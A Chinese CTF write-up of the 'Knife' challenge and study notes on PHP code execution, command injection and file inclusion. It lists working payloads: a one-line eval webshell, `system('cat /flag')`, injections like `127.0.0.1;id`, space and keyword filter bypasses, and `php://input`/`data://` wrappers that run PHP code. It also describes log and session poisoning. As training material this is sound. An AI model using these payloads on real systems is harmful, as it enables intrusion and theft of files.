## 题目来源

[极客大挑战 2019]Knife

## 题目方向 + 知识点

Web 一句话木马、`eval()` 代码执行、POST 参数利用、文件读取。

## 解题思路

这题打开首页后，页面几乎已经把思路写在脸上了。页面正中间直接出现了一句：`eval($_POST["Syc"]);`。我看到这里第一反应不是去猜别的漏洞，而是先把它当成一句话木马入口来验证，因为这句话本身的意思就是：服务端会把 POST 参数 `Syc` 的内容当成 PHP 代码执行。

为了确认不是单纯的迷惑信息，我先发了一个最小化测试请求，让 `Syc` 执行 `phpinfo();`。页面成功回显了完整的 `phpinfo` 内容，这一步就说明入口不是提示，而是真正可用的 PHP 代码执行点。

确认代码执行成立之后，接下来就不需要再绕太多弯，直接利用 PHP 自身函数找 flag 即可。我先POST传入：

```bash
Syc=print_r(scandir('/'));die;
```

这一步的目的是枚举根目录，看 flag 是不是像很多靶场一样直接放在 `/flag` 或类似位置。返回结果里可以明显看到根目录存在一个 `flag` 文件。

既然目标已经定位到了，最后一步就很直接了，继续发送读取文件的 payload：

```bash
Syc=system('cat /flag');
```

### 1. 代码执行

代码执行，指的是**用户输入的内容被当成程序代码执行**。  
这里的“代码”通常是指 PHP 代码、Python 代码、模板语法等，而不是操作系统命令。

最典型的 PHP 场景就是：

```php
eval($_POST['x']);
```

如果我传：

```php
phpinfo();
```

那么服务端就会把这段字符串当成 PHP 代码直接执行。

#### 代码执行的典型特征

- 入口往往是 `eval`、`assert`、动态函数调用
- 传入的是 PHP 语句，而不是 Linux 命令
- 一旦能执行 PHP，通常就能进一步调用 `system()`、`file_get_contents()`、`include()` 等函数

#### 代码执行和命令执行的关系

- 代码执行更高一层，因为我可以在 PHP 里再调命令执行函数
- 命令执行只是在系统层跑命令，不代表我能直接写 PHP 逻辑

也就是说：

- `eval($_POST['x'])` 是代码执行
- `system($_GET['cmd'])` 是命令执行

---

### 2. 命令执行

命令执行，指的是**用户输入被拼进系统命令里，然后由操作系统执行**。

比如：

```php
system("ping -c 4 ".$ip);
```

如果 `ip` 可控，而又没有过滤好，那么我可能传：

```bash
127.0.0.1;id
```

最后实际执行的命令就可能变成：

```bash
ping -c 4 127.0.0.1;id
```

前半句是正常 ping，后半句 `id` 就是我插进去的系统命令。

#### 命令执行的典型特征

- 常见入口是 `system`、`exec`、`shell_exec`、反引号
- 传入的是 Linux / Unix 命令
- 重点在于命令拼接、特殊符号、空格、黑名单、回显

#### 命令执行做题时最关心的点

- 有没有回显
- 过滤了哪些符号
- 过滤了哪些关键字
- 空格能不能用
- 能不能读文件
- 能不能外带结果

---

### 3. 文件包含

文件包含，指的是**程序把用户可控的路径交给 `include` / `require` 等函数去加载**。

比如：

```php
include($_GET['file']);
```

如果参数可控，那我就可以尝试：

- 读本地文件
- 读源码
- 用伪协议构造内容
- 配合日志、Session、上传文件拿 shell

#### 文件包含的本质

文件包含题最核心的不是“读文件”三个字，而是：

- 程序到底是把这个东西当**路径**
- 还是当**PHP 代码来源**
- 还是只是把文件内容当**普通字符串**

这一点后面和 `file_get_contents()` 的区别很关键。

## 二、命令执行基础知识

这一部分我后面要背熟，因为很多题只是过滤不同，本质还是这些基础东西来回组合。

### 1. 常见命令执行函数

#### `system()`

作用：执行系统命令，并且通常会直接把输出显示出来。

```php
system("id");
```

特点：

- 常见
- 有回显
- 题里最爱出

#### `passthru()`

作用：执行外部命令，并将原始输出直接打印到输出流。

```php
passthru("id");
```

特点：

- 也是直接回显
- 和 `system()` 很像

#### `exec()`

作用：执行命令，但默认常常只拿最后一行返回值。

```php
echo exec("id");
```

特点：

- 容易误判“没回显”
- 实际可能只是回显方式不同

#### `shell_exec()`

作用：执行命令，并把完整输出作为字符串返回。

```php
echo shell_exec("id");
```

特点：

- 适合被 `echo` 输出
- 很多题里能直接用

#### 反引号 `` `cmd` ``

PHP 里反引号也可以执行命令，效果接近 `shell_exec()`。

```php
echo `id`;
```

特点：

- 很多人会忘
- 某些过滤只拦 `system` 但没拦反引号

#### `popen()` / `proc_open()`

这两个比前面更灵活，可以开管道、拿输入输出流。

特点：

- 不算 CTF 最常见
- 一旦没被禁用，利用空间会更大

#### `pcntl_exec()`

作用：执行一个程序本体。

特点：

- 题里不高频
- 往往没回显
- 更像“启动程序”，不是简单执行一段命令字符串

---

### 2. `eval()` 为什么要单独记

`eval()` 严格来说不是命令执行函数，它是**代码执行函数**。

```php
eval($_POST['x']);
```

这时候如果我传：

```php
system('id');
```

那么链路其实是：

1. `eval()` 先把我输入的内容当 PHP 执行
2. 我输入的 PHP 里又调用了 `system()`
3. 最终才变成系统命令执行

所以：

- `eval` 是代码执行入口
- `system` 是命令执行入口

这两个要分清。

---

### 3. 命令执行常见读取文件命令

很多题最后其实就是要读 `flag`、`index.php`、`/flag`、`/etc/passwd` 之类的文件，所以我不能只会 `cat`。

#### 最常见

- `cat`
- `tac`
- `nl`
- `more`
- `less`
- `tail`
- `head`

#### 文本处理也常用

- `sed`
- `awk`
- `grep`
- `cut`
- `sort`
- `uniq`

#### 其他能看文件内容的

- `od`
- `strings`
- `vi`
- `vim`
- `nano`

#### 为什么这些替代很重要

因为很多题会过滤：

- `cat`
- `flag`
- 空格

这时我就要想到：

- `tac`
- `nl`
- `more`
- `grep`

有时候只是换个命令就直接过了。

## 三、命令执行绕过思路总整理

这一块是我最需要真正理解的部分。  
做题不是死背 payload，而是先判断它过滤了哪一类东西，再选那一类绕过。

---

### 1. 空格绕过

空格是最常被过滤的。

比如原本我要执行：

```bash
cat flag.php
```

如果空格被拦，我就要把它替换掉。

#### `${IFS}`

`IFS` 是 shell 的内部字段分隔符，常常可以代替空格。

```bash
cat${IFS}flag.php
```

#### `$IFS$9`

也是老题里常见写法。

```bash
cat$IFS$9flag.php
```

#### `%09`

URL 编码的制表符。

```text
cat%09flag.php
```

#### 换行 `%0a`

有的题空格被过滤，但换行没过滤。

```text
127.0.0.1%0aid
```

#### 重定向符号 `<`

如果是读文件，有时候：

```bash
cat<flag.php
```

就不需要空格了。

#### 花括号

某些情况下可以利用：

```bash
{cat,flag.php}
```

shell 解析后等价于：

```bash
cat flag.php
```

但不是所有环境都稳定，做题时要看 shell 解析方式。

---

### 2. 关键字绕过

很多题不是单纯拦符号，而是直接拦：

- `cat`
- `flag`
- `bash`

这时重点是把关键字拆开。

#### 通配符

```bash
cat f*
cat fl?g.php
```

适合文件名已知但被拦关键词的情况。

#### 单引号拆分

```bash
cat fla''g.php
```

shell 仍然会把它拼成 `flag.php`。

#### 双引号拆分

```bash
cat fla""g.php
```

思路一样。

#### 反斜杠拆分

```bash
ca\t flag.php
```

或者：

```bash
wh\o\ami
```

#### 变量拼接

这是高频绕过。

```bash
a=c;b=at;$a$b flag.php
```

或者题里更常见的是拆文件名：

```bash
a=g;cat$IFS$9fla$a.php
```

这类思路本质就是：

- 敏感词不要直接出现
- 让 shell 在运行时再拼出来

#### 环境变量截取

比如：

```bash
${PATH:0:1}
```

常用于取 `/`。

再比如用系统变量里的字符拼接命令名、路径、分隔符，这类在高一点的绕过题里很常见。

---

### 3. 符号绕过

命令执行经常要靠符号完成注入。

#### 分号 `;`

最经典。

```bash
127.0.0.1;id
```

#### 管道 `|`

```bash
127.0.0.1|id
```

有些程序里即使前面的命令失败，后面的也会执行。

#### 与 `&`

```bash
127.0.0.1&id
```

#### 逻辑或 `||`

```bash
aaa||id
```

当前面命令失败时，后面执行。

#### 逻辑与 `&&`

```bash
aaa&&id
```

当前面成功时，后面执行。

#### 换行 `%0a`

这个我在很多题里都见过，很好用。

#### 反引号和 `$()`

这两个是命令替换。

```bash
echo `id`
echo $(id)
```

在某些过滤下可以作为绕过思路。

---

### 4. 无参数 RCE

无参数 RCE 指的是：  
题目不给我明显参数，或者无法直接在正常位置输入完整命令，但仍然要利用 shell 自身特性达成执行。

这类题通常比普通命令执行更绕。

常见思路：

- 利用环境变量
- 利用重定向
- 利用通配符
- 利用已有文件名
- 利用 shell 内建语法

这类我不建议死背太多零散姿势，应该先掌握：

1. shell 怎样解析命令
2. 变量如何展开
3. 文件名通配如何展开
4. 重定向如何生效

这样遇到题才会临场组合。

---

### 5. 无回显 RCE

有的题虽然命令执行成功了，但页面不显示结果。  
这时候不能以为“没打通”，而是要换验证方式。

#### DNSLog 外带

思路：

- 让目标主机向我控制的域名发起 DNS 请求
- 我在 DNSLog 平台看记录

适合：

- 无回显
- 出网允许
- 只想验证是否执行

#### 反弹 shell

思路：

- 让目标连回我的主机
- 我在本地监听端口

适合：

- 能出网
- 想拿交互式 shell

#### 写文件到 Web 目录

思路：

- 命令执行时把结果重定向写入站点目录
- 然后浏览器访问结果文件

#### `tee` / 重定向

比如把命令结果写到临时文件，再读这个文件。

所以做无回显题时，我要先问自己：

- 能不能 DNS 外带
- 能不能反弹
- 能不能写文件
- 能不能通过时间延迟判断执行成功

## 四、`${}` 的用法要单独掌握

你之前单独存过 Linux `${}` 的文章，这块确实值得单开。

### 1. `${var}`

最基本，取变量值。

```bash
a=cat
echo ${a}
```

### 2. `${#var}`

取长度。

```bash
a=abcdef
echo ${#a}
```

结果是：

```text
6
```

### 3. `${var:offset:length}`

截取字符串。

```bash
echo ${PATH:0:1}
```

常常拿来取 `/`。

### 4. `${var/a/b}`

替换字符串。

这类在普通命令执行里不一定高频，但做复杂绕过时很有用。

---

### `${}` 在 RCE 里的真正价值

不是为了学 shell 语法本身，而是为了绕过：

- 关键字过滤
- 斜杠过滤
- 空格过滤
- 路径限制

#### 经典记忆点

- `${IFS}`：代替空格
- `${PATH:0:1}`：取 `/`
- 截取 + 拼接：动态构造敏感词

所以我后面做题时，如果碰到：

- `/` 被过滤
- 空格被过滤
- 某个命令名被过滤

就要第一时间想到 `${}`。

## 五、文件包含基础知识

文件包含题表面看起来都像“传路径”，但实际上有好几类完全不同的题。

---

### 1. `include`、`require` 区别

#### `include()`

- 文件不存在时通常只是 Warning
- 脚本一般还会继续跑

#### `require()`

- 文件不存在时通常是 Fatal Error
- 脚本直接终止

#### `include_once()` / `require_once()`

- 防止重复包含同一个文件
- 有时候会影响复现，因为第二次包含不再生效

所以做题时，如果某题 payload 明明没问题但不生效，我也要考虑：

- 是不是已经 `include_once` 过了

---

### 2. `include` 和 `file_get_contents` 区别

这点非常关键。

#### `include`

它会把文件按 PHP 文件来处理。  
如果文件里有 PHP 代码，可能会执行。

```php
include("shell.php");
```

如果 `shell.php` 里有：

```php
<?php system('id'); ?>
```

那么它会真的执行。

#### `file_get_contents`

它只是读文件内容并返回字符串。

```php
echo file_get_contents("shell.php");
```

这时候不会执行 `shell.php` 里的 PHP，只会把文本内容读出来。

#### 做题意义

所以：

- `include` 更适合拿执行
- `file_get_contents` 更适合拿内容

如果题目只是 `file_get_contents($_GET['file'])`，那通常我重点想的是：

- 读源码
- 读敏感文件

而不是直接拿 `php://input` 执行 PHP。

---

### 3. 文件包含常见攻击方向

#### 直接读本地文件

比如：

- `/etc/passwd`
- `/flag`
- `index.php`
- `config.php`

#### 读取源码

比如 PHP 文件不能直接当文本看时，常配合：

- `php://filter`

#### 利用伪协议构造执行

比如：

- `php://input`
- `data://`

#### 配合二次文件拿 RCE

比如：

- 日志文件
- Session 文件
- 上传文件
- 临时文件

## 六、PHP 伪协议整理

这部分是文件包含题的核心工具箱。

---

### 1. `file://`

作用：访问本地文件系统。

#### 典型用途

- 读取本地文件
- 绝对路径读取
- 相对路径读取
- 目录穿越上溯

#### 例子

```text
?file=file:///etc/passwd
?file=file:///var/www/html/index.php
```

很多时候其实不写 `file://` 也行，直接传路径也能读。

---

### 2. `php://filter`

这是最常用、也最值得背熟的伪协议。

#### 最经典用途：读 PHP 源码

```text
php://filter/convert.base64-encode/resource=index.php
```

原理：

- 直接包含 `index.php` 会执行代码
- 用 `filter` 先 base64 编码后再读
- 就能拿到源码文本

#### 常见形式

```text
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/convert.base64-encode/resource=index.php
```

#### 做题时的优先级

只要题里看到：

- `include($_GET['file'])`
- `require($_GET['file'])`
- `readfile($_GET['file'])`

我一般都会先试 `php://filter`。

---

### 3. `php://input`

作用：把原始 POST 数据当作输入流读取。

#### 典型利用

如果题目是：

```php
include($_GET['file']);
```

那么我可以传：

```text
?file=php://input
```

然后 POST：

```php
<?php system('id'); ?>
```

如果环境允许，这样就相当于把我 POST 的 PHP 代码包含并执行了。

#### 适用前提

- 入口必须真的会“包含”这个流
- 题目不是单纯 `file_get_contents`
- 某些环境设置会影响效果

---

### 4. `data://`

作用：直接把我构造的数据当作资源。

#### 常见形式

```text
data://text/plain,hello
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

#### 做题作用

如果题目允许 `include` 某个路径，而我又不方便上传文件，那我可以直接在 URL 里“现场造一个文件”。

#### 为什么有时要用 base64

因为：

- 特殊字符可能被过滤
- `+`、`=`、空格等会影响传输
- base64 有时更稳定

---

### 5. `zip://`

作用：从压缩包里访问内部文件。

#### 常见场景

- 上传一个图片马 / 压缩包
- 再通过 `zip://` 去包含里面的 PHP 文件

#### 典型写法

```text
zip://shell.jpg%23shell.php
```

这里 `%23` 是 `#`，表示压缩包内文件定位。

---

### 6. `phar://`

这个协议在单纯文件包含题里不一定天天见，但在反序列化题里非常重要。

#### 典型思路

- 某些文件操作函数在处理 `phar://` 时会触发元数据反序列化
- 所以表面上是文件操作，实际上能打到反序列化链

这是后期进阶必学内容。

---

### 7. `expect://`

如果环境开启，`expect://` 可能直接执行命令。

#### 特点

- 不常见
- 但一旦可用就很强

所以我看到能用伪协议时，也可以顺手想一下它。

---

### 8. 其他补充协议

- `compress.zlib://`
- `ftp://`
- `http://`

其中：

- `http://` 常和远程文件包含有关
- `compress.zlib://` 偶尔可拿来读压缩内容

## 七、文件包含常见绕过方式

---

### 1. 路径绕过

最基础的是：

```text
../
```

#### 常见思路

- 相对路径上溯
- 多层上溯
- 绝对路径
- 当前目录猜测

比如：

```text
../../../../flag
```

#### PHP 路径整理特性

这点你之前也注意到了，很重要。

PHP 对路径有时会做规范化整理，比如：

```text
/var/www/html/aaa/../index.php
```

可能最终会被整理成：

```text
/var/www/html/index.php
```

这就是为什么某些题里前面带一段“看似无效”的路径，后面依旧能上溯成功。

---

### 2. 后缀绕过

很多题会强行给路径拼上：

```php
".php"
```

这时候就要考虑绕过。

#### `%00` 截断

老环境经典。

```text
?file=../../../../etc/passwd%00
```

现代环境很多已经不行，但我仍然要知道它。

#### `?`、`#`

有时利用路径解析差异，把后缀影响掉。

#### 双写 / 伪装

看具体过滤逻辑而定。

---

### 3. 关键字过滤绕过

如果题目拦：

- `php`
- `data`
- `flag`

我就考虑：

- 大小写变化
- base64
- 字符串拆分
- 伪协议组合

比如：

- `pHp://input`
- `data://text/plain;base64,...`

---

### 4. 配合写文件

有些题不是让我直接包含现成文件，而是让我先写一个文件，再去包含它。

#### 常见函数

- `file_put_contents`

#### 常见配合

- `php://filter/write=...`
- `string.rot13`
- `convert.base64-decode`
- `convert.iconv.*`

这类题一般会更绕，因为还要考虑：

- 内容如何被写入
- 是否有 `die`
- 是否会被过滤
- 编码是否会被破坏

---

### 5. 配合二次文件

这类是文件包含题特别高频的利用链。

#### 日志包含

思路：

1. 先把 PHP 代码写进 Web 日志
2. 再去 `include` 这个日志文件
3. 日志里的 PHP 被执行

#### Session 包含

思路：

1. 把可控内容写进 Session 文件
2. 再包含 Session 文件

#### 上传文件包含

思路：

1. 上传图片马 / PHP 文件
2. 再通过包含点执行

#### 临时文件包含

有些题会打：

- 上传临时文件
- 竞争条件

这个和 ctfshow 某些题就很像。

---

## 八、做题时的常见题型套路

这一部分是把前面的知识变成“解题流程”。

---

### 1. 命令执行题怎么打

我现在习惯按这个顺序：

#### 第一步：验证执行点

先试最小 payload：

- `;id`
- `|id`
- `%0aid`

先确认是不是命令执行，不要上来就硬打 flag。

#### 第二步：看回显

如果有输出，我就知道：

- 可以直接读文件

如果没输出，我就转无回显思路。

#### 第三步：看过滤

重点测试：

- 空格
- 分号
- 管道
- 换行
- `cat`
- `flag`

#### 第四步：读源码或读 flag

先读：

- 当前目录文件
- `index.php`
- `flag`
- `flag.php`

#### 第五步：再做针对性绕过

比如：

- 空格被拦 -> `${IFS}` / `%09`
- `flag` 被拦 -> 通配符 / 拼接
- `cat` 被拦 -> `tac` / `nl` / `more`

---

### 2. 文件包含题怎么打

我一般这样走：

#### 第一步：判断是 `include` 还是单纯读文件

这一步非常关键。

#### 第二步：优先读源码

常试：

```text
php://filter/convert.base64-encode/resource=index.php
```

因为很多题真正线索都在源码里。

#### 第三步：尝试伪协议执行

常试：

- `php://input`
- `data://`

#### 第四步：不行再考虑二次文件

- 日志
- Session
- 上传文件

#### 第五步：考虑路径和过滤绕过

- `../`
- 后缀绕过
- 协议绕过
- 编码绕过
